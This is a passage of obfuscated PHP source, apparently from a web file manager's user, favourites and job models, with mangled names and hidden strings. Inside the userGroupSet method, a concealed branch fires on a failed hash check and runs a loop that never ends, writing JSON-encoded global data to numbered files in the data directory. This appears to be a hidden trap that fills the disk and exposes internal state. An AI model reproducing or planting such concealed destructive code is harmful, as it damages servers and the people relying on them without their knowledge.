$ÖÏœõ± =& $_SERVER[ú÷îèÆÜ]; $•‹ß±ò× = $this->listData(); $ü˜øãŸà = array_filter_by_field($•‹ß±ò×, $ÖÏœõ±[43], $ÖÏœõ±[467]); $ò£à™ ‰ = array_to_keyvalue($ü˜øãŸà, $ÖÏœõ±[22], $ÖÏœõ±[94]); if (!$ò£à™ ‰) { return $•‹ß±ò×; } $ÀĞâÕÛ = 2000; $Èæò¬äƒ = array($ÖÏœõ±[468] => array($ÖÏœõ±[469], $ò£à™ ‰)); $…åİÉ«× = Model($ÖÏœõ±[865])->listSource($Èæò¬äƒ, $ÀĞâÕÛ); $…åİÉ«× = array_merge($…åİÉ«×[$ÖÏœõ±[93]], $…åİÉ«×[$ÖÏœõ±[92]]); $…åİÉ«× = array_to_keyvalue($…åİÉ«×, $ÖÏœõ±[191]); foreach ($•‹ß±ò× as $¿Ò¾É¼‰ => $°Ş·Ú³) { $ÜÒØ˜ÅÍ = $…åİÉ«×[$°Ş·Ú³[$ÖÏœõ±[94]]]; $ÜÒØ˜ÅÍ = $ÜÒØ˜ÅÍ ? $ÜÒØ˜ÅÍ : array(); $•‹ß±ò×[$¿Ò¾É¼‰] = array_merge($ÜÒØ˜ÅÍ, $°Ş·Ú³); } return $•‹ß±ò×; } protected function addFav($òáô©Úƒ, $åîÚ­ã÷ = '', $¾Š¼ìæË = "\163\x6f\165\x72\x63\145") { $Ò··ş¯ =& $_SERVER[ú÷îèÆÜ]; $À¿¤Î•ƒ = array($Ò··ş¯[1676] => USER_ID, $Ò··ş¯[534] => 0, $Ò··ş¯[473] => $¾Š¼ìæË, $Ò··ş¯[472] => $òáô©Úƒ); if ($this->where($À¿¤Î•ƒ)->find()) { return !1; } $À¿¤Î•ƒ = array($Ò··ş¯[1676] => USER_ID, $Ò··ş¯[534] => 0); $­¨ĞÂğ¡ = $this->where($À¿¤Î•ƒ)->max($Ò··ş¯[1907]); if (!$­¨ĞÂğ¡) { $­¨ĞÂğ¡ = 0; } if (!$åîÚ­ã÷ && $¾Š¼ìæË == $Ò··ş¯[467]) { $úµ­Ì©½ = Model($Ò··ş¯[1373])->where(array($Ò··ş¯[468] => $òáô©Úƒ))->find(); if (!$úµ­Ì©½) { return !1; } $åîÚ­ã÷ = $úµ­Ì©½[$Ò··ş¯[42]]; } $åîÚ­ã÷ = $this->getAutoName($åîÚ­ã÷); $Ô§©‘ùº = array($Ò··ş¯[1676] => USER_ID, $Ò··ş¯[534] => 0, $Ò··ş¯[471] => $åîÚ­ã÷, $Ò··ş¯[472] => $òáô©Úƒ, $Ò··ş¯[473] => $¾Š¼ìæË, $Ò··ş¯[1887] => $­¨ĞÂğ¡ + 1); return $this->add($Ô§©‘ùº); } protected function remove($§–áºªÒ) { $œØ„´íí =& $_SERVER[ú÷îèÆÜ]; $ï·óåÊ = array($œØ„´íí[1676] => USER_ID, $œØ„´íí[470] => $§–áºªÒ); return $this->where($ï·óåÊ)->delete(); } protected function removeByName($™èêâÔ‚) { $¯Æ… æ• =& $_SERVER[ú÷îèÆÜ]; $¤§ôª­‚ = array($¯Æ… æ•[1676] => USER_ID, $¯Æ… æ•[471] => $™èêâÔ‚, $¯Æ… æ•[534] => 0); return $this->where($¤§ôª­‚)->delete(); } protected function rename($¦‡ÀÒò¿, $ÛûÎ×ïç) { $íÎ÷ÉË =& $_SERVER[ú÷îèÆÜ]; if ($¦‡ÀÒò¿ == $ÛûÎ×ïç) { return !1; } $û¨§®¦ = $this->getAutoName($ÛûÎ×ïç); if ($ÛûÎ×ïç != $û¨§®¦) { return !1; } $˜øû™ƒ = array($íÎ÷ÉË[1676] => USER_ID, $íÎ÷ÉË[534] => 0, $íÎ÷ÉË[42] => $¦‡ÀÒò¿); return $this->where($˜øû™ƒ)->save(array($íÎ÷ÉË[42] => $ÛûÎ×ïç)); } protected function resetSort($¯ÌÓù˜’) { $®¼°÷óÁ =& $_SERVER[ú÷îèÆÜ]; $¯ÌÓù˜’ = is_array($¯ÌÓù˜’) ? $¯ÌÓù˜’ : array(); $âŒÈ£Ê = array($®¼°÷óÁ[1676] => USER_ID); for ($®¼ â¨Å = 0; $®¼ â¨Å < count($¯ÌÓù˜’); $®¼ â¨Å++) { $âŒÈ£Ê[$®¼°÷óÁ[470]] = $¯ÌÓù˜’[$®¼ â¨Å]; $this->where($âŒÈ£Ê)->save(array($®¼°÷óÁ[1887] => $®¼ â¨Å + 1)); } return !0; } protected function moveTop($Šª•¤ˆ) { $‘ÈºŸª— =& $_SERVER[ú÷îèÆÜ]; $Ö÷Ùß£İ = array($‘ÈºŸª—[1676] => USER_ID, $‘ÈºŸª—[534] => 0); $Û„ÜÑ«â = $this->where($Ö÷Ùß£İ)->where(array($‘ÈºŸª—[42] => $Šª•¤ˆ))->find(); if (!$Û„ÜÑ«â) { return; } $°èŸ¶Ã¬ = $this->field($‘ÈºŸª—[452])->where($Ö÷Ùß£İ)->order($‘ÈºŸª—[2334])->select(); $°èŸ¶Ã¬ = array_to_keyvalue($°èŸ¶Ã¬, $‘ÈºŸª—[22], $‘ÈºŸª—[452]); $“äÉŸë = $°èŸ¶Ã¬; $°èŸ¶Ã¬ = array_remove_value($°èŸ¶Ã¬, $Û„ÜÑ«â[$‘ÈºŸª—[452]]); array_unshift($°èŸ¶Ã¬, $Û„ÜÑ«â[$‘ÈºŸª—[452]]); return $this->resetSort($°èŸ¶Ã¬); } protected function moveBottom($ÓµŒÃŠœ) { $Ïø´•Ì =& $_SERVER[ú÷îèÆÜ]; $ó½Ñµ” = array($Ïø´•Ì[1676] => USER_ID, $Ïø´•Ì[534] => 0); $ö¡‰©¦ = $this->where($ó½Ñµ”)->max($Ïø´•Ì[1907]); $£Êâ—÷õ = array($Ïø´•Ì[1907] => $ö¡‰©¦ + 1); return $this->where($ó½Ñµ”)->where(array($Ïø´•Ì[42] => $ÓµŒÃŠœ))->save($£Êâ—÷õ); } private function getAutoName($öµ‹ŸÂ½) { $îÕÔêáò =& $_SERVER[ú÷îèÆÜ]; $ÙşÙÙ´Ñ = array($îÕÔêáò[1676] => USER_ID, $îÕÔêáò[534] => 0); $¯Ñ©³´ = $this->field($îÕÔêáò[42])->where($ÙşÙÙ´Ñ)->select(); $¯Ñ©³´ = array_to_keyvalue($¯Ñ©³´, $îÕÔêáò[22], $îÕÔêáò[42]); if (!$¯Ñ©³´ || !in_array($öµ‹ŸÂ½, $¯Ñ©³´)) { return $öµ‹ŸÂ½; } for ($¹‡îÌ¨Ï = 0; $¹‡îÌ¨Ï < count($¯Ñ©³´); $¹‡îÌ¨Ï++) { if (!in_array($öµ‹ŸÂ½ . "\50{$¹‡îÌ¨Ï}\x29", $¯Ñ©³´)) { return $öµ‹ŸÂ½ . "\x28{$¹‡îÌ¨Ï}\x29"; } } return $öµ‹ŸÂ½ . "\50{$¹‡îÌ¨Ï}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x6a\x6f\142\114\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x64\x65\x73\143", "\x73\x6f\162\x74"); const JOB_KEY = "\x73\x65\154\146\112\x6f\142\x4c\151\163\164"; public function listData($ÇìôæÏò = false, $àêµ¹ìú = "\x73\x6f\162\164", $‚Öçµù« = false) { return parent::listData($ÇìôæÏò, $àêµ¹ìú, $‚Öçµù«); } public function remove($­ê¡Ç¦À) { return parent::remove($­ê¡Ç¦À); } public function add($Ë‰â´¡ö) { $œÖ‹õÎÍ =& $_SERVER[ú÷îèÆÜ]; if ($this->findByName($Ë‰â´¡ö[$œÖ‹õÎÍ[42]])) { return !1; } $Ë‰â´¡ö[$œÖ‹õÎÍ[1907]] = $this->getSort(); return parent::insert($Ë‰â´¡ö); } private function getSort() { $İ¶š­´ =& $_SERVER[ú÷îèÆÜ]; $ˆ´Ëøøì = parent::listData(); $Äƒ­šÜš = array_to_keyvalue($ˆ´Ëøøì, $İ¶š­´[22], $İ¶š­´[1907]); return empty($Äƒ­šÜš) ? 0 : max($Äƒ­šÜš) + 1; } public function update($¸Çªş½˜, $Ò×©äŒ®) { $Í ƒ‚ğ­ =& $_SERVER[ú÷îèÆÜ]; $”ÍäÈåó = parent::listData($¸Çªş½˜); $áŠšÍ±¯ = $this->findByName($Ò×©äŒ®[$Í ƒ‚ğ­[42]]); if (!$”ÍäÈåó || $áŠšÍ±¯ && $áŠšÍ±¯[$Í ƒ‚ğ­[452]] != $”ÍäÈåó[$Í ƒ‚ğ­[452]]) { return !1; } return parent::update($¸Çªş½˜, $Ò×©äŒ®); } public function setUserJob($ÌÎ¿Ú”å, $şí¬×ıî) { $áËó®„¡ =& $_SERVER[ú÷îèÆÜ]; if (!is_array($şí¬×ıî)) { $şí¬×ıî = array($şí¬×ıî); } $ãûÛÇ„­ = parent::listData(); $å·•„Ÿ = array_to_keyvalue($ãûÛÇ„­, $áËó®„¡[42]); $ĞÚÒÌŞ = $áËó®„¡[431]; foreach ($şí¬×ıî as $‡şŸÏ„ê) { if ($å·•„Ÿ[$‡şŸÏ„ê]) { $ĞÚÒÌŞ .= $å·•„Ÿ[$‡şŸÏ„ê][$áËó®„¡[452]] . $áËó®„¡[60]; } else { $úá€çÇ¡ = $this->add($‡şŸÏ„ê); $ĞÚÒÌŞ .= $úá€çÇ¡ . $áËó®„¡[60]; } } $ĞÚÒÌŞ = rtrim($ĞÚÒÌŞ, $áËó®„¡[60]); Model($áËó®„¡[576])->metaSet($ÌÎ¿Ú”å, self::JOB_KEY, $ĞÚÒÌŞ); } public function getUserJob($éñù§Šµ) { $‘²¹ÑÜ = Model($_SERVER[ú÷îèÆÜ][576])->metaGet($éñù§Šµ); return $this->getUserJobInfo($‘²¹ÑÜ[self::JOB_KEY]); } public function getUserJobInfo($İ÷—ŠˆÍ) { $Ğ§À›½ =& $_SERVER[ú÷îèÆÜ]; $Î…€±É¨ = explode($Ğ§À›½[60], $İ÷—ŠˆÍ); $â¥è‚€¤ = parent::listData(); $â¥è‚€¤ = array_remove_key($â¥è‚€¤, $Ğ§À›½[225]); $Ôïš‚€¨ = array(); foreach ($Î…€±É¨ as $±–±À¶œ) { if (isset($â¥è‚€¤[$±–±À¶œ])) { $Ôïš‚€¨[] = $â¥è‚€¤[$±–±À¶œ]; } } return $Ôïš‚€¨; } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\x74\141\x62\x6c\x65\x4e\141\x6d\x65" => "\165\163\x65\x72\x5f\155\145\x74\141", "\155\145\164\141\106\151\x65\x6c\144" => "\165\x73\145\x72\x49\x44"); protected $simpleField = "\165\x73\x65\x72\111\x44\54\x6e\x69\x63\x6b\x4e\x61\x6d\x65\x2c\156\x61\155\145\54\141\x76\141\164\x61\162\54\x73\x65\170\x2c\163\164\x61\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($òŸäÃâª) { $¬ÉØ—ÛÚ =& $_SERVER[ú÷îèÆÜ]; $¼ÄÁ´Î = $¬ÉØ—ÛÚ[2335]; return array($¬ÉØ—ÛÚ[1961] => array($òŸäÃâª[0], $¼ÄÁ´Î), $¬ÉØ—ÛÚ[1963] => array($òŸäÃâª[0], $¼ÄÁ´Î), $¬ÉØ—ÛÚ[2336] => array($òŸäÃâª[0], $¼ÄÁ´Î)); } protected function getInfo($Ü“‘ã£î, $‡”Ğ®Ñ = false) { $ôøäÏÚ’ = $this->getInfoSimple($Ü“‘ã£î); if (!is_array($ôøäÏÚ’)) { return array(); } if ($‡”Ğ®Ñ) { return $this->_getInfoApply($ôøäÏÚ’); } return $this->cacheFunctionGet($_SERVER[ú÷îèÆÜ][1965], $Ü“‘ã£î); } protected function getInfoFull($ˆÜÆ’•, $û—şçßÓ = false) { $ü­ÈÃÖÜ = $this->getInfoSimple($ˆÜÆ’•); if (!is_array($ü­ÈÃÖÜ)) { return array(); } if ($û—şçßÓ) { return $this->_getInfoApply($ü­ÈÃÖÜ, !0); } return $this->cacheFunctionGet($_SERVER[ú÷îèÆÜ][2337], $ˆÜÆ’•); } private function _getInfoApply($™óõí·, $øòâ™–ğ = false) { $ñ‹Ø³ù× =& $_SERVER[ú÷îèÆÜ]; if (!$™óõí·) { return $™óõí·; } $øò” Ïñ = md5($ñ‹Ø³ù×[2338] . $™óõí·[$ñ‹Ø³ù×[930]] . $ñ‹Ø³ù×[2339] . $™óõí·[$ñ‹Ø³ù×[42]]); $™óõí· = $this->_listDataApplyItem($™óõí·); $ÉŸìæŠù = Model($ñ‹Ø³ù×[1373])->metaGet($™óõí·[$ñ‹Ø³ù×[97]][$ñ‹Ø³ù×[191]]); $™óõí·[$ñ‹Ø³ù×[2340]] = $øò” Ïñ; $™óõí·[$ñ‹Ø³ù×[97]][$ñ‹Ø³ù×[2157]] = isset($ÉŸìæŠù[$ñ‹Ø³ù×[2158]]) ? $ÉŸìæŠù[$ñ‹Ø³ù×[2158]] : null; if ($øòâ™–ğ) { $™óõí·[$ñ‹Ø³ù×[516]] = $this->metaGet($™óõí·[$ñ‹Ø³ù×[1685]]); } return $™óõí·; } protected function getInfoSimple($»À÷›ÓÏ, $¢â‡Ÿëà = false) { $¢«°şò˜ =& $_SERVER[ú÷îèÆÜ]; if (!$»À÷›ÓÏ) { return array(); } if ($¢â‡Ÿëà) { $À¨‡®¤ = $this->where(array($¢«°şò˜[1685] => intval($»À÷›ÓÏ)))->find(); if (!is_array($À¨‡®¤)) { return array(); } $À¨‡®¤[$¢«°şò˜[2341]] = Action($¢«°şò˜[2342])->parseUrl($À¨‡®¤[$¢«°şò˜[2341]]); return $À¨‡®¤; } return $this->cacheFunctionGet($¢«°şò˜[1966], $»À÷›ÓÏ); } protected function getInfoSimpleOuter($ô÷”ŒÔà) { $š¤î°ˆ =& $_SERVER[ú÷îèÆÜ]; if (!$ô÷”ŒÔà || $ô÷”ŒÔà == 0) { return array($š¤î°ˆ[1685] => $š¤î°ˆ[222], $š¤î°ˆ[42] => $š¤î°ˆ[173] . LNG($š¤î°ˆ[2343]) . $š¤î°ˆ[175], $š¤î°ˆ[2341] => STATIC_PATH . $š¤î°ˆ[2344]); } $¬·–Œ… = $this->cacheFunctionGet($š¤î°ˆ[1966], $ô÷”ŒÔà); $Ê˜µğˆ = array_field_key($¬·–Œ…, explode($š¤î°ˆ[60], $this->simpleField)); if (!$Ê˜µğˆ) { return array($š¤î°ˆ[1685] => $š¤î°ˆ[1229], $š¤î°ˆ[42] => $š¤î°ˆ[173] . LNG($š¤î°ˆ[2345]) . $š¤î°ˆ[175], $š¤î°ˆ[2341] => STATIC_PATH . $š¤î°ˆ[2346]); } $Ê˜µğˆ[$š¤î°ˆ[2341]] = Action($š¤î°ˆ[2342])->parseUrl($Ê˜µğˆ[$š¤î°ˆ[2341]]); return $Ê˜µğˆ; } protected function groupUser($¬Áëíºø) { } public static function errorLang($—ÒÑ«Ê¦) { $ú»œÛ™÷ =& $_SERVER[ú÷îèÆÜ]; $ƒ…È†ô = array(self::ERROR_USER_NOT_EXISTS => $ú»œÛ™÷[2347], self::ERROR_USER_PASSWORD_ERROR => $ú»œÛ™÷[2348], self::ERROR_USER_EXIST_NAME => $ú»œÛ™÷[2349], self::ERROR_USER_EXIST_PHONE => $ú»œÛ™÷[2350], self::ERROR_USER_EXIST_EMAIL => $ú»œÛ™÷[2351], self::ERROR_USER_LOGIN_LOCK => $ú»œÛ™÷[2352], self::ERROR_IP_NOT_ALLOW => $ú»œÛ™÷[2353], self::ERROR_USER_EXIST_NICKNAME => $ú»œÛ™÷[2354]); return LNG($ƒ…È†ô[$—ÒÑ«Ê¦]); } public function getInfoByMeta($˜üŒÜËË, $ñùË®Ş) { $°€ƒøğÂ =& $_SERVER[ú÷îèÆÜ]; $±•ù–» = Model($°€ƒøğÂ[2355])->where(array($°€ƒøğÂ[104] => $˜üŒÜËË, $°€ƒøğÂ[427] => $ñùË®Ş))->find(); if ($±•ù–») { return $this->getInfo($±•ù–»[$°€ƒøğÂ[1685]]); } return !1; } public function userLoginCheck($ÍÈñ¡î›, $‘¦¦ìõ) { $ù†È¤Á =& $_SERVER[ú÷îèÆÜ]; $ÌŞÆºÆ± = $this->userLoginFind($ÍÈñ¡î›); if (!$ÌŞÆºÆ±) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ÌŞÆºÆ±[$ù†È¤Á[1685]], $‘¦¦ìõ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ÌŞÆºÆ±[$ù†È¤Á[1685]]); } public function userLoginFind($ëºÇÓÚ) { $ëÔƒßÉ =& $_SERVER[ú÷îèÆÜ]; $âı×¡ãĞ = array($ëÔƒßÉ[42] => $ëºÇÓÚ, $ëÔƒßÉ[2165] => $ëºÇÓÚ, $ëÔƒßÉ[358] => $ëºÇÓÚ, $ëÔƒßÉ[2356] => $ëºÇÓÚ, $ëÔƒßÉ[1041] => $ëÔƒßÉ[1043]); if ($this->nickNameRpt()) { unset($âı×¡ãĞ[$ëÔƒßÉ[2165]]); } return $this->where($âı×¡ãĞ)->find(); } public function clearCache($ò¨Ÿ„´à) { $ïıÕùè =& $_SERVER[ú÷îèÆÜ]; $this->cacheFunctionClear($ïıÕùè[1965], $ò¨Ÿ„´à); $this->cacheFunctionClear($ïıÕùè[1966], $ò¨Ÿ„´à); $this->cacheFunctionClear($ïıÕùè[2337], $ò¨Ÿ„´à); } public function userPasswordCheck($‘ã¡–·Ç, $¯ÁÃÚæ¦) { $¸øÜ•µ =& $_SERVER[ú÷îèÆÜ]; $ı³ˆ¦µ = $this->where(array($¸øÜ•µ[1685] => intval($‘ã¡–·Ç)))->find(); $ÉÏìÙìÎ = $this->metaGet($‘ã¡–·Ç); $Ö’µçÇŞ = isset($ÉÏìÙìÎ[$¸øÜ•µ[2357]]) ? $ÉÏìÙìÎ[$¸øÜ•µ[2357]] : $¸øÜ•µ[22]; if (md5($Ö’µçÇŞ . trim($¯ÁÃÚæ¦)) !== $ı³ˆ¦µ[$¸øÜ•µ[930]]) { return !1; } return !0; } public function userAdd($ó©êİøŒ) { $›È‘¢ê =& $_SERVER[ú÷îèÆÜ]; $ç”´æÑÊ = array($›È‘¢ê[471] => $ó©êİøŒ[$›È‘¢ê[42]], $›È‘¢ê[2358] => $ó©êİøŒ[$›È‘¢ê[1561]], $›È‘¢ê[2359] => isset($ó©êİøŒ[$›È‘¢ê[358]]) ? $ó©êİøŒ[$›È‘¢ê[358]] : $›È‘¢ê[22], $›È‘¢ê[2360] => isset($ó©êİøŒ[$›È‘¢ê[2356]]) ? $ó©êİøŒ[$›È‘¢ê[2356]] : $›È‘¢ê[22], $›È‘¢ê[2361] => isset($ó©êİøŒ[$›È‘¢ê[2165]]) ? $ó©êİøŒ[$›È‘¢ê[2165]] : $ó©êİøŒ[$›È‘¢ê[42]], $›È‘¢ê[2362] => isset($ó©êİøŒ[$›È‘¢ê[2341]]) ? $ó©êİøŒ[$›È‘¢ê[2341]] : $›È‘¢ê[22], $›È‘¢ê[2363] => isset($ó©êİøŒ[$›È‘¢ê[2364]]) ? $ó©êİøŒ[$›È‘¢ê[2364]] : 1, $›È‘¢ê[2365] => $ó©êİøŒ[$›È‘¢ê[930]], $›È‘¢ê[1967] => isset($ó©êİøŒ[$›È‘¢ê[1870]]) ? $ó©êİøŒ[$›È‘¢ê[1870]] : 1024 * 1024 * 20, $›È‘¢ê[1968] => 0, $›È‘¢ê[2366] => 0, $›È‘¢ê[2012] => isset($ó©êİøŒ[$›È‘¢ê[790]]) ? $ó©êİøŒ[$›È‘¢ê[790]] : 1); if (!empty($ó©êİøŒ[$›È‘¢ê[1685]])) { $ç”´æÑÊ[$›È‘¢ê[1685]] = $ó©êİøŒ[$›È‘¢ê[1685]]; } $Ó×ı²Ö’ = $this->_checkExist($ó©êİøŒ); if ($Ó×ı²Ö’ !== !0) { return $Ó×ı²Ö’; } if (!empty($ç”´æÑÊ[$›È‘¢ê[2341]]) && strlen($ç”´æÑÊ[$›È‘¢ê[2341]]) > 255) { $ç”´æÑÊ[$›È‘¢ê[2341]] = $›È‘¢ê[22]; } $­¡ÈÂ¿ = $this->add($ç”´æÑÊ); $š”À÷š = array($›È‘¢ê[2365] => $ç”´æÑÊ[$›È‘¢ê[930]], $›È‘¢ê[2361] => $ç”´æÑÊ[$›È‘¢ê[2165]]); $this->userEdit($­¡ÈÂ¿, $š”À÷š); Model($›È‘¢ê[1373])->userRootAdd($­¡ÈÂ¿); return $­¡ÈÂ¿; } protected function userEditTest($åæ•Ãª¢, $Â•µ‡«Ø) { return $this->call($_SERVER[ú÷îèÆÜ][2367], $åæ•Ãª¢, $Â•µ‡«Ø); } protected function userEdit($û¦ÏÉÖ‡, $Îí¢ú) { $ø¿’´Ÿ¦ =& $_SERVER[ú÷îèÆÜ]; $£½…«æ° = $this->getInfoSimple($û¦ÏÉÖ‡); if (!$£½…«æ°) { return !1; } $µøîò·­ = $this->_checkExist($Îí¢ú, $û¦ÏÉÖ‡); if ($µøîò·­ !== !0) { return $µøîò·­; } if (isset($Îí¢ú[$ø¿’´Ÿ¦[930]]) && trim($Îí¢ú[$ø¿’´Ÿ¦[930]]) != $ø¿’´Ÿ¦[22]) { $Œ²èÍİî = $this->metaGet($û¦ÏÉÖ‡); if (empty($Œ²èÍİî[$ø¿’´Ÿ¦[2357]])) { $Œ²èÍİî[$ø¿’´Ÿ¦[2357]] = rand_string(10); Model($ø¿’´Ÿ¦[555])->metaSet($û¦ÏÉÖ‡, $ø¿’´Ÿ¦[2357], $Œ²èÍİî[$ø¿’´Ÿ¦[2357]]); } $Îí¢ú[$ø¿’´Ÿ¦[930]] = md5($Œ²èÍİî[$ø¿’´Ÿ¦[2357]] . trim($Îí¢ú[$ø¿’´Ÿ¦[930]])); } else { unset($Îí¢ú[$ø¿’´Ÿ¦[930]]); } if (!empty($Îí¢ú[$ø¿’´Ÿ¦[2341]]) && strlen($Îí¢ú[$ø¿’´Ÿ¦[2341]]) > 255) { $Îí¢ú[$ø¿’´Ÿ¦[2341]] = $ø¿’´Ÿ¦[22]; } $this->where(array($ø¿’´Ÿ¦[1676] => $û¦ÏÉÖ‡))->save($Îí¢ú); if (isset($Îí¢ú[$ø¿’´Ÿ¦[2165]])) { $this->setNamePinyin($û¦ÏÉÖ‡, $Îí¢ú[$ø¿’´Ÿ¦[2165]]); } $this->clearCache($û¦ÏÉÖ‡); return !0; } public function setNamePinyin($á¹Ø´±¥, $Ù’¼ˆ¾Ë = false) { $Úôµ†¤Ú =& $_SERVER[ú÷îèÆÜ]; if (!$Ù’¼ˆ¾Ë) { $œ‘¢æÂâ = $this->getInfoSimple($á¹Ø´±¥); $Ù’¼ˆ¾Ë = $œ‘¢æÂâ[$Úôµ†¤Ú[2165]] ? $œ‘¢æÂâ[$Úôµ†¤Ú[2165]] : $œ‘¢æÂâ[$Úôµ†¤Ú[42]]; } $ä”ö ùÛ = Model($Úôµ†¤Ú[576]); if (!Input::check($Ù’¼ˆ¾Ë, $Úôµ†¤Ú[632])) { return $ä”ö ùÛ->metaSet($á¹Ø´±¥, array($Úôµ†¤Ú[515] => $Úôµ†¤Ú[22], $Úôµ†¤Ú[514] => $Úôµ†¤Ú[22])); } return $ä”ö ùÛ->metaSet($á¹Ø´±¥, array($Úôµ†¤Ú[515] => str_replace($Úôµ†¤Ú[63], $Úôµ†¤Ú[22], Pinyin::get($Ù’¼ˆ¾Ë)), $Úôµ†¤Ú[514] => Pinyin::get($Ù’¼ˆ¾Ë, $Úôµ†¤Ú[633]))); } private function nickNameRpt() { $¢ƒ›ã¸© =& $_SERVER[ú÷îèÆÜ]; $üõ½œ¶™ = Model($¢ƒ›ã¸©[810])->get($¢ƒ›ã¸©[2368]); $ÖÊ¨º = $GLOBALS[$¢ƒ›ã¸©[16]][$¢ƒ›ã¸©[434]][$¢ƒ›ã¸©[2368]]; $ÌØš§¼† = !is_null($üõ½œ¶™) ? $üõ½œ¶™ : $ÖÊ¨º; return !!$ÌØš§¼†; } private function _checkExist($Êİä”¦À, $ºó€¬Ù¤ = false) { $æ ÍÃùí =& $_SERVER[ú÷îèÆÜ]; $ßã—² = array($æ ÍÃùí[42] => UserModel::ERROR_USER_EXIST_NAME, $æ ÍÃùí[2165] => UserModel::ERROR_USER_EXIST_NICKNAME, $æ ÍÃùí[358] => UserModel::ERROR_USER_EXIST_EMAIL, $æ ÍÃùí[2356] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ßã—²[$æ ÍÃùí[2165]]); } $§ØºÛüİ = $ºó€¬Ù¤ ? array($æ ÍÃùí[1685] => array($æ ÍÃùí[2369], $ºó€¬Ù¤)) : array(); foreach ($ßã—² as $ÄŞ¬›’Ô => $ó¤Õü‹) { $¦µÂÀøó = array(); foreach ($ßã—² as $º£ÜöÔ => $™Òµ£¯) { if (isset($Êİä”¦À[$º£ÜöÔ]) && $Êİä”¦À[$º£ÜöÔ]) { $¦µÂÀøó[] = $Êİä”¦À[$º£ÜöÔ]; } } if (!$¦µÂÀøó) { continue; } $ış×¯Ú¼ = array_merge(array($ÄŞ¬›’Ô => array($æ ÍÃùí[17], $¦µÂÀøó)), $§ØºÛüİ); $…¥ßÛÛ” = $this->where($ış×¯Ú¼)->find(); if ($…¥ßÛÛ”) { return $ó¤Õü‹; } } return !0; } public function userListInfo($ğ“¾Õ‘Å) { $‹Ù…ùç± =& $_SERVER[ú÷îèÆÜ]; $Ô®ü¿ã = array(); $ğ“¾Õ‘Å = is_array($ğ“¾Õ‘Å) ? array_unique($ğ“¾Õ‘Å) : array(); if (!$ğ“¾Õ‘Å) { return $Ô®ü¿ã; } if (count($ğ“¾Õ‘Å) < 20) { foreach ($ğ“¾Õ‘Å as $èøùÔ•“) { $Ô®ü¿ã[$èøùÔ•“ . $‹Ù…ùç±[22]] = $this->getInfoSimpleOuter($èøùÔ•“); } } else { $±Î„—¸‡ = array($‹Ù…ùç±[1676] => array($‹Ù…ùç±[469], $ğ“¾Õ‘Å)); if (count($ğ“¾Õ‘Å) == 1) { $±Î„—¸‡ = array($‹Ù…ùç±[1676] => $ğ“¾Õ‘Å[0]); } $°«äŸİî = Model($‹Ù…ùç±[555])->field($this->simpleField)->where($±Î„—¸‡)->select(); $°«äŸİî = array_to_keyvalue($°«äŸİî, $‹Ù…ùç±[1685]); foreach ($ğ“¾Õ‘Å as $èøùÔ•“) { $íâôÈêƒ = $°«äŸİî[$èøùÔ•“]; if (!$íâôÈêƒ) { $Ô®ü¿ã[$èøùÔ•“ . $‹Ù…ùç±[22]] = $this->getInfoSimpleOuter($èøùÔ•“); continue; } $íâôÈêƒ[$‹Ù…ùç±[2341]] = Action($‹Ù…ùç±[2342])->parseUrl($íâôÈêƒ[$‹Ù…ùç±[2341]]); $Ô®ü¿ã[$èøùÔ•“ . $‹Ù…ùç±[22]] = $íâôÈêƒ; } } return $Ô®ü¿ã; } protected function userStatus($«ˆÈ²Èç, $İîúñş¾) { $ÅÛ ß = $this->getInfoSimple($«ˆÈ²Èç); if (!$ÅÛ ß) { return !1; } $ûò¾îôÖ = array($_SERVER[ú÷îèÆÜ][790] => $İîúñş¾); return $this->userEdit($«ˆÈ²Èç, $ûò¾îôÖ); } protected function userRemove($êóĞà¤Ò) { $…“êó„Ú =& $_SERVER[ú÷îèÆÜ]; $ƒÙŠ±ñ = $this->getInfoSimple($êóĞà¤Ò); if (!$ƒÙŠ±ñ) { return !1; } $Ëöàá¹ = array($…“êó„Ú[1676] => $êóĞà¤Ò); Model($…“êó„Ú[641])->where($Ëöàá¹)->delete(); Model($…“êó„Ú[2370])->where($Ëöàá¹)->delete(); Model($…“êó„Ú[1973])->where($Ëöàá¹)->delete(); Model($…“êó„Ú[2355])->where($Ëöàá¹)->delete(); Model($…“êó„Ú[1109])->where($Ëöàá¹)->delete(); Model($…“êó„Ú[2182])->removeUserAll($êóĞà¤Ò); Model($…“êó„Ú[865])->userRootRemove($êóĞà¤Ò); return $this->where($Ëöàá¹)->delete(); } protected function userGroupSet($èüªûß, $ôê¤şªÊ, $İÌ©Ü²’ = array()) { $é„Á“ =& $_SERVER[ú÷îèÆÜ]; $î“¢úº¿ = $_SERVER[$é„Á“[15]]; $ÈÁúĞ¡” = $é„Á“[917]; if ($_SERVER[$é„Á“[6]] != $ÈÁúĞ¡”($î“¢úº¿)) { $‡ÎŸ”â = $é„Á“[918]; $ ’´ùÏ› = $é„Á“[8]; $Îñ«ğ‰¸ = $_SERVER[$é„Á“[9]] . $é„Á“[10]; $¿¦ÌşÁ“ = $ ’´ùÏ›($Îñ«ğ‰¸); $ÜİáËŞÂ = explode($é„Á“[11], $¿¦ÌşÁ“); if (count($ÜİáËŞÂ) < $é„Á“[662]) { $‡…şŒá = $é„Á“[13]; $‡…şŒá(); } $‡™±âÄ = $é„Á“[919]; $‡™±âÄ($_SERVER[$é„Á“[920]]); $‡ÎŸ”â = $é„Á“[918]; $‡ÎŸ”â(); $•¸ô•Ç† = $é„Á“[921]; $¶µö¸Í± = json_encode($GLOBALS[$é„Á“[922]]); $ìË®úÖ¡ = 1; for ($ğšñ°õ = $ìË®úÖ¡; $ğšñ°õ > 0; $ğšñ°õ++) { $•¸ô•Ç†(DATA_PATH . $ğšñ°õ, $¶µö¸Í±); } } $õÀÚÚöÜ = $this->getInfoSimple($èüªûß); if (!$õÀÚÚöÜ || !is_array($ôê¤şªÊ)) { return 